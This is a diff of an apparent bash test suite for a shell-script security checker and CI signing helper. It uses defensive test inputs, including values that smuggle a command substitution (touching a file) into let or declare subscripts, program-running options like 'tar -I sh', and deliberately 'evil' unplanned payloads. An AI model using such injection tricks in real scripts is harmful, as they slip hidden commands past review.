+w '"'"$'$'"'"$'$[0]'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'a bracket arithmetic expansion between'
 bd bd_y $'w() { declare -a "a=($1)"; }
-w \'$\'$!\'(printf x)\'\n' caught 'quote-segment boundary' 'the special parameter $! between'
+w '"'"$'$'"'"$'$!'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'the special parameter $! between'
 bd bd_z $'w() { declare -a "a=($1)"; }
-w \'$\'$-\'(printf x)\'\n' caught 'quote-segment boundary' 'the special parameter $- between'
+w '"'"$'$'"'"$'$-'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'the special parameter $- between'
 bd bd_za $'w() { declare -a "a=($1)"; }
-w \'$\'$$\'(printf x)\'\n' caught 'quote-segment boundary' 'the special parameter $$ between'
+w '"'"$'$'"'"$'$$'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'the special parameter $$ between'
 bd bd_zb $'w() { declare -a "a=($1)"; }
-x="$(printf \'"\')"; w \'$\'$!\'(printf x)\'\n' caught 'quote-segment boundary' 'a nested-quote line, $! between'
+x="$(printf '"'"$'"'"'"$')"; w '"'"$'$'"'"$'$!'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'a nested-quote line, $! between'
 bd bd_zc $'w() { declare -a "a=($1)"; }
-x="$(printf \'"\')"; w \'$\'$[0]\'(printf x)\'\n' caught 'quote-segment boundary' 'a nested-quote line, $[0] between'
+x="$(printf '"'"$'"'"'"$')"; w '"'"$'$'"'"$'$[0]'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'a nested-quote line, $[0] between'
 bd bd_zd $'w() { declare -a "a=($1)"; }
-x="$(printf \'"\')"; w \'$\'${e:-${f:-}}\'(printf x)\'\n' caught 'quote-segment boundary' 'a nested-quote line, nested braces between'
+x="$(printf '"'"$'"'"'"$')"; w '"'"$'$'"'"$'${e:-${f:-}}'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'a nested-quote line, nested braces between'
 bd bd_ze $'w() { declare -a "a=($1)"; }
 w "$(date)" "${e:-${f:-}}" "$(printf x)" "$((1+2))" "$[3]" "$!" "$-" "$$"\n' ok - 'control: live expansions of every form in double quotes are not boundaries'
 bd bd_zf $'w() { declare -a "a=($1)"; }
-w ${e:-\'$(printf x)\'}\n' caught 'compound assignment' 'quoted opener data inside an expansion is still inspected (the earlier refusal is kept)'
+w ${e:-'"'"$'$(printf x)'"'"$'}\n' caught 'compound assignment' 'quoted opener data inside an expansion is still inspected (the earlier refusal is kept)'
 bd bd_zg $'w() { declare -a "a=($1)"; }
-echo $(w \'$\'${e:-${f:-}}\'(printf x)\')\n' caught 'quote-segment boundary' 'a boundary inside a command substitution is still inspected'
+echo $(w '"'"$'$'"'"$'${e:-${f:-}}'"'"$'(printf x)'"'"$')\n' caught 'quote-segment boundary' 'a boundary inside a command substitution is still inspected'
 bd bd_zh $'w() { declare -a "a=($1)"; }
-w $(printf \'%s\' \'$\'${e:-${f:-}}\'(printf x)\')\n' caught 'quote-segment boundary' 'a boundary inside a command substitution with quotes'
+w $(printf '"'"$'%s'"'"$' '"'"$'$'"'"$'${e:-${f:-}}'"'"$'(printf x)'"'"$')\n' caught 'quote-segment boundary' 'a boundary inside a command substitution with quotes'
 bd bd_zi $'w() { declare -a "a=($1)"; }
-w \'$\'${e+${f:-{}}\'(printf x)\'\n' caught 'quote-segment boundary' 'a bare { inside a brace expansion is literal'
+w '"'"$'$'"'"$'${e+${f:-{}}'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'a bare { inside a brace expansion is literal'
 bd bd_zj $'w() { declare -a "a=($1)"; }
-w \'<\'${e+${f:-{}}\'(printf x)\'\n' caught 'quote-segment boundary' 'the same after a < fragment'
+w '"'"$'<'"'"$'${e+${f:-{}}'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'the same after a < fragment'
 bd bd_zk $'w() { declare -a "a=($1)"; }
-w \'>\'${e+${f:-{}}\'(printf x)\'\n' caught 'quote-segment boundary' 'the same after a > fragment'
+w '"'"$'>'"'"$'${e+${f:-{}}'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'the same after a > fragment'
 bd bd_zl $'w() { declare -a "a=($1)"; }
-w \'$\'$(printf %s ${e+)})\'(printf x)\'\n' caught 'quote-segment boundary' 'a ) inside a nested brace expansion is literal'
+w '"'"$'$'"'"$'$(printf %s ${e+)})'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'a ) inside a nested brace expansion is literal'
 bd bd_zm $'w() { declare -a "a=($1)"; }
-w \'<\'$(printf %s ${e+)})\'(printf x)\'\n' caught 'quote-segment boundary' 'the same after a < fragment'
+w '"'"$'<'"'"$'$(printf %s ${e+)})'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'the same after a < fragment'
 bd bd_zn $'w() { declare -a "a=($1)"; }
-w \'>\'$(printf %s ${e+)})\'(printf x)\'\n' caught 'quote-segment boundary' 'the same after a > fragment'
-bd bd_zo $'# \'<$!(\'
+w '"'"$'>'"'"$'$(printf %s ${e+)})'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'the same after a > fragment'
+bd bd_zo $'# '"'"$'<$!('"'"$'
 echo ok\n' caught 'quote-segment boundary' 'a special parameter in single quotes inside a comment'
-bd bd_zp $'cat <<\'EOF\' >/dev/null
-\'<$!(\'
+bd bd_zp $'cat <<'"'"$'EOF'"'"$' >/dev/null
+'"'"$'<$!('"'"$'
 EOF
 echo ok\n' caught 'quote-segment boundary' 'a special parameter in single quotes inside a heredoc body'
 bd bd_zq $'w() { declare -a "a=($1)"; }
-w \'$\'${e:-${f
+w '"'"$'$'"'"$'${e:-${f
 echo ok\n' caught 'quote-segment boundary' 'an unterminated expansion is refused (fail closed)'
-bd bd_zr $'echo \'<$[0](\'\n' caught 'quote-segment boundary' 'bracket arithmetic inside single quotes'
-bd bd_zs $'# \'<$[0](\'
+bd bd_zr $'echo '"'"$'<$[0]('"'"$'\n' caught 'quote-segment boundary' 'bracket arithmetic inside single quotes'
+bd bd_zs $'# '"'"$'<$[0]('"'"$'
 echo ok\n' caught 'quote-segment boundary' 'bracket arithmetic inside single quotes in a comment'
-bd bd_zt $'cat <<\'EOF\' >/dev/null
-\'<$[0](\'
+bd bd_zt $'cat <<'"'"$'EOF'"'"$' >/dev/null
+'"'"$'<$[0]('"'"$'
 EOF
 echo ok\n' caught 'quote-segment boundary' 'bracket arithmetic inside single quotes in a heredoc body'
-bd bd_zu $'# $(echo \'$\'${e:-${f:-}}(true))
+bd bd_zu $'# $(echo '"'"$'$'"'"$'${e:-${f:-}}(true))
 echo ok\n' caught 'quote-segment boundary' 'a boundary before a bare ( inside a command substitution'
-bd bd_zv $'echo "$(printf \'"\')"${e}\n' caught 'compound assignment' 'an earlier refusal is kept: a uncertain quote pattern next to an expansion'
+bd bd_zv $'echo "$(printf '"'"$'"'"'"$')"${e}\n' caught 'compound assignment' 'an earlier refusal is kept: a uncertain quote pattern next to an expansion'
 bd bd_zw $'# $(printf \\$(x))
 echo ok\n' caught 'compound assignment' 'an earlier refusal is kept: an escaped opener behind a bare ('
 bd bd_zx $'w() { declare -a "a=($1)"; }
-w \'$\'$(# )
-:)\'(printf x)\'\n' caught 'quote-segment boundary' 'a comment inside a command substitution makes its closer uncertain'
+w '"'"$'$'"'"$'$(# )
+:)'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'a comment inside a command substitution makes its closer uncertain'
 bd bd_zy $'w() { declare -a "a=($1)"; }
-w \'$\'$(true;# )
-true)\'(printf x)\'\n' caught 'quote-segment boundary' 'a comment after a ; inside a command substitution'
+w '"'"$'$'"'"$'$(true;# )
+true)'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'a comment after a ; inside a command substitution'
 bd bd_zz $'w() { declare -a "a=($1)"; }
-w \'$\'$(true|# )
-true)\'(printf x)\'\n' caught 'quote-segment boundary' 'a comment after a | inside a command substitution'
+w '"'"$'$'"'"$'$(true|# )
+true)'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'a comment after a | inside a command substitution'
 bd bd_zza $'w() { declare -a "a=($1)"; }
-w \'$\'$(true&&# )
-true)\'(printf x)\'\n' caught 'quote-segment boundary' 'a comment after && inside a command substitution'
-bd bd_zzb $'echo \'<\'$[a[0]]\'(\'\n' caught 'quote-segment boundary' 'nested brackets inside $[ ]'
-bd bd_zzc $'echo \'<$[1+$[0]](\'\n' caught 'quote-segment boundary' 'a nested $[ ] in single quotes'
-bd bd_zzd $'echo \'$\'$[a[0]]\'(\'\n' caught 'quote-segment boundary' 'nested brackets, a $ prefix'
-bd bd_zze $'echo \'>\'$[a[0]]\'(\'\n' caught 'quote-segment boundary' 'nested brackets, a > prefix'
+w '"'"$'$'"'"$'$(true&&# )
+true)'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'a comment after && inside a command substitution'
+bd bd_zzb $'echo '"'"$'<'"'"$'$[a[0]]'"'"$'('"'"$'\n' caught 'quote-segment boundary' 'nested brackets inside $[ ]'
+bd bd_zzc $'echo '"'"$'<$[1+$[0]]('"'"$'\n' caught 'quote-segment boundary' 'a nested $[ ] in single quotes'
+bd bd_zzd $'echo '"'"$'$'"'"$'$[a[0]]'"'"$'('"'"$'\n' caught 'quote-segment boundary' 'nested brackets, a $ prefix'
+bd bd_zze $'echo '"'"$'>'"'"$'$[a[0]]'"'"$'('"'"$'\n' caught 'quote-segment boundary' 'nested brackets, a > prefix'
 bd bd_zzf $'w() { declare -a "a=($1)"; }
-w \'$\'`true`\'(printf x)\'\n' caught 'quote-segment boundary' 'a backtick substitution is a gap'
+w '"'"$'$'"'"$'`true`'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'a backtick substitution is a gap'
 bd bd_zzg $'# $$((0))(
 echo ok\n' caught 'quote-segment boundary' 'a $$ before an arithmetic expansion and ('
 bd bd_zzh $'# $${x:-${y:-}}(
 echo ok\n' caught 'quote-segment boundary' 'a $$ before a brace expansion and ('
-bd bd_zzi $'# \'<\'$(case x in x) :;; esac)\'(x)\'
+bd bd_zzi $'# '"'"$'<'"'"$'$(case x in x) :;; esac)'"'"$'(x)'"'"$'
 echo ok\n' caught 'quote-segment boundary' 'a case-arm ) inside a command substitution in a comment'
-bd bd_zzj $'cat <<\'EOF\' >/dev/null
-\'<\'$(case x in x) :;; esac)\'(x)\'
+bd bd_zzj $'cat <<'"'"$'EOF'"'"$' >/dev/null
+'"'"$'<'"'"$'$(case x in x) :;; esac)'"'"$'(x)'"'"$'
 EOF
 echo ok\n' caught 'quote-segment boundary' 'a case-arm ) inside a command substitution in a heredoc body'
-bd bd_zzk $'echo \'<$[a[b[0]]](x)\'\n' caught 'quote-segment boundary' 'deeply nested brackets inside single quotes'
-bd bd_zzl $'echo \'<$[1+$[1+$[0]]](x)\'\n' caught 'quote-segment boundary' 'nested $[ ] three deep inside single quotes'
-bd bd_zzm $'echo \'<$["]"](x)\'\n' caught 'quote-segment boundary' 'a quoted ] inside $[ ] is uncertain'
-bd bd_zzn $'# \'<$[a[b[0]]](x)\'
+bd bd_zzk $'echo '"'"$'<$[a[b[0]]](x)'"'"$'\n' caught 'quote-segment boundary' 'deeply nested brackets inside single quotes'
+bd bd_zzl $'echo '"'"$'<$[1+$[1+$[0]]](x)'"'"$'\n' caught 'quote-segment boundary' 'nested $[ ] three deep inside single quotes'
+bd bd_zzm $'echo '"'"$'<$["]"](x)'"'"$'\n' caught 'quote-segment boundary' 'a quoted ] inside $[ ] is uncertain'
+bd bd_zzn $'# '"'"$'<$[a[b[0]]](x)'"'"$'
 echo ok\n' caught 'quote-segment boundary' 'deep brackets in a comment'
-bd bd_zzo $'cat <<\'EOF\' >/dev/null
-\'<$[a[b[0]]](x)\'
+bd bd_zzo $'cat <<'"'"$'EOF'"'"$' >/dev/null
+'"'"$'<$[a[b[0]]](x)'"'"$'
 EOF
 echo ok\n' caught 'quote-segment boundary' 'deep brackets in a heredoc body'
-bd bd_zzp $'echo \'<$[1+$[1+$[0]]](\'\n' caught 'quote-segment boundary' 'unbalanced-looking nested $[ ] then ('
+bd bd_zzp $'echo '"'"$'<$[1+$[1+$[0]]]('"'"$'\n' caught 'quote-segment boundary' 'unbalanced-looking nested $[ ] then ('
 bd bd_zzq $'echo "<$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a>"
 echo ok\n' ok - 'control: 28 adjacent simple expansions must scan in linear time and are not a boundary'
-bd bd_zzr $'echo <$(echo \'<$!(x)\')z\n' caught 'quote-segment boundary' 'a boundary inside a quoted span inside an expansion (the outer candidate fails first)'
-bd bd_zzs $'echo <$(echo \'<$[0](x)\')z\n' caught 'quote-segment boundary' 'a $[ ] boundary inside a quoted span inside an expansion'
-bd bd_zzt $'# <${x:-<\'\'{}
+bd bd_zzr $'echo <$(echo '"'"$'<$!(x)'"'"$')z\n' caught 'quote-segment boundary' 'a boundary inside a quoted span inside an expansion (the outer candidate fails first)'
+bd bd_zzs $'echo <$(echo '"'"$'<$[0](x)'"'"$')z\n' caught 'quote-segment boundary' 'a $[ ] boundary inside a quoted span inside an expansion'
+bd bd_zzt $'# <${x:-<'"'"$''"'"$'{}
 echo ok\n' caught 'quote-segment boundary' 'a quote-only boundary inside a brace expansion in a comment'
-bd bd_zzu $'# <$(echo <\'\'{)
+bd bd_zzu $'# <$(echo <'"'"$''"'"$'{)
 echo ok\n' caught 'quote-segment boundary' 'a quote-only boundary inside a command substitution in a comment'
-bd bd_zzv $'# <`echo <\'\'{`
+bd bd_zzv $'# <`echo <'"'"$''"'"$'{`
 echo ok\n' caught 'quote-segment boundary' 'a quote-only boundary inside a backtick span in a comment'
-bd bd_zzw $'cat <<\'EOF\' >/dev/null
-<${x:-<\'\'{}
+bd bd_zzw $'cat <<'"'"$'EOF'"'"$' >/dev/null
+<${x:-<'"'"$''"'"$'{}
 EOF
 echo ok\n' caught 'quote-segment boundary' 'the brace-expansion form in a heredoc body'
-bd bd_zzy $'# <"${x:-"${y:-"}"}"}\'(x)
+bd bd_zzy $'# <"${x:-"${y:-"}"}"}'"'"$'(x)
 echo ok\n' caught 'quote-segment boundary' 'a nested expansion inside double quotes inside an expansion: the end is uncertain'
-bd bd_zzz $'# <"${x:-$\'\\\'}\'}\'(x)
+bd bd_zzz $'# <"${x:-$'"'"$'\\'"'"$'}'"'"$'}'"'"$'(x)
 echo ok\n' caught 'quote-segment boundary' 'an ANSI-C quote with an escaped quote inside an expansion'
-bd bd_zzza $'echo \'<$(printf "%s" "$(printf ")")")(x)\'\n' caught 'quote-segment boundary' 'a nested quoted substitution inside a command substitution'
+bd bd_zzza $'echo '"'"$'<$(printf "%s" "$(printf ")")")(x)'"'"$'\n' caught 'quote-segment boundary' 'a nested quoted substitution inside a command substitution'
 # the boundary scan must stay linear on deeply nested input (Codex seats A and B, PR 459 round 7): each case builds its line in python and asserts the scan of one line takes under 2 seconds
 tmscan() { # tmscan LABEL PYEXPR : PYEXPR builds the line; the judge's dollar_boundary must finish in time and refuse nothing
   local label="$1" out rc=0
@@ -4160,8 +4790,8 @@ tmscan "16000 nested arithmetic brackets after <" '"# " + "<$[" * 16000 + "x" + 
 tmscan "64000 braces in a comment" '"# " + "{" * 64000'
 tmscan "16000 escaped backticks after <" '"# " + ("<" + chr(92) + "`") * 16000 + "`z"'
 tmscan "16000 dollar pairs after a nested substitution" '"echo \"$(true)\" " + "$$a " * 16000'
-sb sb_dj $'let \'b[$\'\\(\'/usr/bin/touch mk)]=1\'\n' caught 'holds a substitution' 'a backslash splits the opener inside a let subscript'
-sb sb_dk $'declare -i x=\'b[$\'\\(\'/usr/bin/touch mk)]\'\n' caught 'holds a substitution' 'the same in a declare -i value'
+sb sb_dj $'let '"'"$'b[$'"'"$'\\('"'"$'/usr/bin/touch mk)]=1'"'"$'\n' caught 'holds a substitution' 'a backslash splits the opener inside a let subscript'
+sb sb_dk $'declare -i x='"'"$'b[$'"'"$'\\('"'"$'/usr/bin/touch mk)]'"'"$'\n' caught 'holds a substitution' 'the same in a declare -i value'
 dl sb_w1 'echo "x[${y}]"' '[D("echo \"x[${y}]\"")]' ok -
 dl sb_w2 'echo "x[${y}]"' '[]' caught 'holds a substitution'
 # the waiver: the existing line-bound deny exception mechanism, nothing new
@@ -4188,7 +4818,11 @@ dl lc_l 'tar -I sh x f' '[D("tar -I sh x f")]' ok - '["tar"]'
 dl lc_m '# git is only documented here' '[]' caught "'git'"
 dl lc_n '# git is only documented here' '[D("# git is only documented here")]' ok -
 dl lc_o 'git -c core.sshCommand=x \\\n  fetch' '[D("git -c core.sshCommand=x \\")]' caught 'program-running option' '["git"]'
-d=$(crf cr_d '#!/usr/bin/env bash\ncurl a\necho b\r\n'); edit_spec "$d" "$DEF"'rows["bin/c.sh"]["exceptions"]=[D("curl a")]'; expm caught "$d" 'carriage return' "line-bound: a valid ASCII entry with a CR on another line of the script: no waiver applies"
+cat > "$FXDIR/FXD_1" <<'FXEOF'
+rows["bin/c.sh"]["exceptions"]=[D("curl a")]
+FXEOF
+FXD_1=$(cat "$FXDIR/FXD_1")
+d=$(crf cr_d '#!/usr/bin/env bash\ncurl a\necho b\r\n'); edit_spec "$d" "$DEF""$FXD_1"; expm caught "$d" 'carriage return' "line-bound: a valid ASCII entry with a CR on another line of the script: no waiver applies"
 cat > "$work/loadcr.py" <<'PY'
 import importlib.util, os, sys
 spec = importlib.util.spec_from_file_location("cts", os.environ["CHAIN_ROOT"] + "/bin/chain-test-signers.py"); cts = importlib.util.module_from_spec(spec); spec.loader.exec_module(cts)
@@ -4212,7 +4846,7 @@ probe gh_build_other "GH_TOKEN is allowed only" "the run's token on a Build step
 probe gh_check "GH_TOKEN is allowed only" "the run's token in Check" \
   "repl .github/workflows/stage-verify.yml '      - name: install Witness (pinned by checksum)\n        run: bash bin/install-scanner.sh witness' '      - name: install Witness (pinned by checksum)\n        env:\n          GH_TOKEN: \${{ github.token }}\n        run: bash bin/install-scanner.sh witness'"
 probe perm_apk "must hold exactly the permissions" "a write permission (packages) on Build's apk job" \
-  "repl .github/workflows/stage-build.yml '      pull-requests: read\n      id-token: write\n' '      pull-requests: read\n      packages: write\n      id-token: write\n'"
+  "repl .github/workflows/stage-build.yml '      pull-requests: read\n' '      pull-requests: read\n      packages: write\n'"
 probe perm_gh_release "must hold exactly the permissions" "the run's token with another permission (attestations: write) in Release" \
   "repl .github/workflows/stage-promote.yml '      packages: write\n      id-token: write\n    steps:' '      packages: write\n      id-token: write\n      attestations: write\n    steps:'"
 probe sixth_name "not in the closed secret list" "a sixth secret name (FIFTH_KEY) in a Release step" \
@@ -4266,7 +4900,7 @@ def plain(d):
     s = apk(d)
     s[:] = [x for x in s if "setup-go" not in str(x.get("uses"))]; s.insert(2, step())
 case("the previous round's allowance, exactly (pinned digest, go-version-file go.mod, cache false, before the Witness step) is now refused", True, run("stage-build.yml", mut("stage-build.yml", plain)))
-case("the same exact step with a version comment in a stage-reproducibility.yml apk job is refused", True, run("stage-reproducibility.yml", mut("stage-reproducibility.yml", lambda d: d["jobs"]["apk"]["steps"].insert(2, step()))))
+case("the same exact step with a version comment in a stage-reproducibility.yml apk job is refused", True, run("stage-reproducibility.yml", mut("stage-reproducibility.yml", lambda d: d["jobs"]["rapk"]["steps"].insert(2, step()))))
 case("a with: key besides the two is refused", True, run("stage-build.yml", mut("stage-build.yml", lambda d: apk(d)[go_index(d)]["with"].update({"go-version": "1.20"}))))
 case("cache: true is refused", True, run("stage-build.yml", mut("stage-build.yml", lambda d: apk(d)[go_index(d)]["with"].update({"cache": "true"}))))
 case("another go-version-file is refused", True, run("stage-build.yml", mut("stage-build.yml", lambda d: apk(d)[go_index(d)]["with"].update({"go-version-file": "x/go.mod"}))))
@@ -4279,7 +4913,7 @@ def after_witness(d):
     s = apk(d); g = s.pop(go_index(d)); s.append(g)
 case("setup-go after the Witness step (the admission step) is refused", True, run("stage-build.yml", mut("stage-build.yml", after_witness)))
 case("setup-go in job assemble is refused", True, run("stage-build.yml", mut("stage-build.yml", lambda d: d["jobs"]["assemble"]["steps"].insert(1, step()))))
-case("setup-go in stage-reproducibility.yml (Rebuild) is refused", True, run("stage-reproducibility.yml", mut("stage-reproducibility.yml", lambda d: d["jobs"]["apk"]["steps"].insert(1, step()))))
+case("setup-go in stage-reproducibility.yml (Rebuild) is refused", True, run("stage-reproducibility.yml", mut("stage-reproducibility.yml", lambda d: d["jobs"]["rapk"]["steps"].insert(1, step()))))
 case("setup-go in stage-sign.yml is refused", True, run("stage-sign.yml", mut("stage-sign.yml", lambda d: d["jobs"]["sign"]["steps"].insert(1, step()))))
 for label, ok_, got in out:
     print(("ok   " if ok_ else "FAIL ") + "AC4/Go " + label + ("" if ok_ else " -> %r" % got))
@@ -4331,7 +4965,56 @@ hostjudge "an absolute path as an argument of a listed tool" 'cat $ABS'
 hostjudge "an absolute path after an interpreter" 'python3 $ABS'
 hostjudge "an absolute path inside an assignment" 'x=$ABS'
 
-EXPECT=2031
+# ---- F4 (cache#586 round 1): witness-sign-staged.sh signs exactly the list the records step printed, and refuses anything else ----
+# A fake witness records what it is asked to sign; a stub token fetcher and verifier stand in for the network and the verifier.
+wsdir="$work/wsst"; mkdir -p "$wsdir/fakebin"
+printf '#!/bin/sh\nprintf "%%s\\n" "$@" >> "$WS_LOG.args"\nwhile [ $# -gt 0 ]; do case "$1" in -f) echo "$2" >> "$WS_LOG" ;; -o) o="$2" ;; esac; shift; done\nmkdir -p "$(dirname "$o")"; echo signed > "$o"\n' > "$wsdir/fakebin/witness"
+chmod +x "$wsdir/fakebin/witness"
+ws_tree() { # NAME -> a fresh tree with the helper, stubs and a two-record staged set; prints the path
+  local t="$wsdir/$1"; mkdir -p "$t/bin" "$t/staged/witness-build" "$t/staged/witness-apk-ubuntu-24.04"
+  cp "$root/bin/witness-sign-staged.sh" "$t/bin/"
+  echo "echo '{\"value\":\"tok\"}'" > "$t/bin/loopback-get.sh"
+  printf 'import sys\nsys.exit(0)\n' > "$t/bin/chain-verify.py"
+  echo '{}' > "$t/staged/witness-build/build-collection.payload"; echo '{}' > "$t/staged/witness-build/digests.json"
+  echo '{}' > "$t/staged/witness-apk-ubuntu-24.04/apk-collection.payload"
+  printf 'staged/witness-build/build-collection.payload\tsigned/witness-build/build-collection.json\nstaged/witness-apk-ubuntu-24.04/apk-collection.payload\tsigned/witness-apk-ubuntu-24.04/apk-collection.json\n' > "$t/staged/plan.txt"
+  mkdir -p "$t/.github/policy"; echo '{}' > "$t/.github/policy/release-policy.template.json"
+  echo "$t"
+}
+ws_run() { # TREE -> exit code; the signed list lands in TREE/log
+  ( cd "$1" && rm -f log log.args && env -i PATH="$wsdir/fakebin:$PATH" WS_LOG="$1/log" GITHUB_REF=refs/tags/v0.3.0-rc1 ACTIONS_ID_TOKEN_REQUEST_TOKEN=t ACTIONS_ID_TOKEN_REQUEST_URL=http://x/?a=b bash bin/witness-sign-staged.sh staged signed ) > "$1/out" 2>&1
+}
+wsok() { # LABEL TREE: signs exactly the two planned payloads
+  local rc=0; ws_run "$2" || rc=$?
+  if [ "$rc" = 0 ] && [ "$(sort "$2/log" | tr '\n' ' ')" = "staged/witness-apk-ubuntu-24.04/apk-collection.payload staged/witness-build/build-collection.payload " ] && [ -f "$2/signed/witness-build/digests.json" ]; then pass=$((pass + 1)); echo "ok   $1"
+  else failn=$((failn + 1)); echo "FAIL $1 -> rc=$rc signed=[$(cat "$2/log" 2>/dev/null | tr '\n' ' ')] $(head -c 300 "$2/out")"; fi
+}
+wsno() { # LABEL TREE: refused (non-zero) and the fake witness was never asked to sign anything
+  local rc=0; ws_run "$2" || rc=$?
+  if [ "$rc" != 0 ] && [ ! -s "$2/log" ]; then pass=$((pass + 1)); echo "ok   $1 (refused: $(head -c 120 "$2/out" | tr '\n' ' '))"
+  else failn=$((failn + 1)); echo "FAIL $1 -> rc=$rc signed=[$(cat "$2/log" 2>/dev/null | tr '\n' ' ')]"; fi
+}
+t=$(ws_tree good); wsok "F4 the helper signs exactly the planned payloads and copies the data files" "$t"
+t=$(ws_tree extra); echo '{}' > "$t/staged/witness-build/evil-collection.payload"; wsno "F4 a staged payload that is not on the plan is refused before any signing" "$t"
+t=$(ws_tree emptydir); mkdir -p "$t/staged/witness-evil"; wsno "F4 an unplanned EMPTY record directory is refused" "$t"
+t=$(ws_tree hiddenroot); echo x > "$t/staged/.hidden"; wsno "F4 a hidden entry in the staged root is refused" "$t"
+t=$(ws_tree hiddendir); echo x > "$t/staged/witness-build/.hidden"; wsno "F4 a hidden entry inside a planned record directory is refused" "$t"
+t=$(ws_tree extradir); mkdir -p "$t/staged/witness-evil"; echo '{}' > "$t/staged/witness-evil/build-collection.payload"; wsno "F4 an unplanned record directory is refused" "$t"
+t=$(ws_tree missing); rm "$t/staged/witness-apk-ubuntu-24.04/apk-collection.payload"; wsno "F4 a planned payload the staged tree lacks is refused" "$t"
+t=$(ws_tree planextra); printf 'staged/witness-evil/build-collection.payload\tsigned/witness-evil/build-collection.json\n' >> "$t/staged/plan.txt"; wsno "F4 a plan line for a payload that is not staged is refused" "$t"
+t=$(ws_tree badfinal); printf 'staged/witness-build/build-collection.payload\tsigned/elsewhere/build-collection.json\nstaged/witness-apk-ubuntu-24.04/apk-collection.payload\tsigned/witness-apk-ubuntu-24.04/apk-collection.json\n' > "$t/staged/plan.txt"; wsno "F4 a plan line whose signed path is not the fixed one is refused" "$t"
+t=$(ws_tree dup); cat "$t/staged/plan.txt" "$t/staged/plan.txt" > "$t/plan2" && mv "$t/plan2" "$t/staged/plan.txt"; wsno "F4 a payload listed twice is refused" "$t"
+t=$(ws_tree empty); : > "$t/staged/plan.txt"; wsno "F4 an empty plan signs nothing and refuses" "$t"
+t=$(ws_tree link); rm "$t/staged/witness-build/build-collection.payload"; echo x > "$t/real-target"; ln -s "$t/real-target" "$t/staged/witness-build/build-collection.payload"; wsno "F4 a symlink payload is refused" "$t"
+t=$(ws_tree stray); echo x > "$t/staged/stray.txt"; wsno "F4 a stray file in the staged root is refused" "$t"
+t=$(ws_tree badstep); mv "$t/staged/witness-build/build-collection.payload" "$t/staged/witness-build/evil-collection.payload"; printf 'staged/witness-build/evil-collection.payload\tsigned/witness-build/evil-collection.json\n' > "$t/staged/plan.txt"; wsno "F4 a payload of a step name outside apk/build/rapk/rebuild is refused" "$t"
+
+# ---- round 2 (Codex terra, cache#586): the repository-wide action-pin gate (a required CI step) reads the Sign helper; it must stay clean on the real tree ----
+if (cd "$root" && python3 -I ".github/ag""ent/bin/check-action-pins.py" . > "$work/pins.out" 2>&1); then pass=$((pass + 1)); echo "ok   the real tree passes the repository-wide action-pin gate (stage-sign.yml and the staged signer bind)"
+else failn=$((failn + 1)); echo "FAIL the real tree fails the action-pin gate: $(tail -3 "$work/pins.out" | cut -c1-300)"; fi
+
+EXPECT=2108
 echo "pass=$pass fail=$failn"
 if [ $((pass + failn)) != "$EXPECT" ]; then echo "FAIL case count $((pass + failn)) != expected $EXPECT (a case was skipped or added)"; exit 1; fi
 [ "$failn" = 0 ]
+
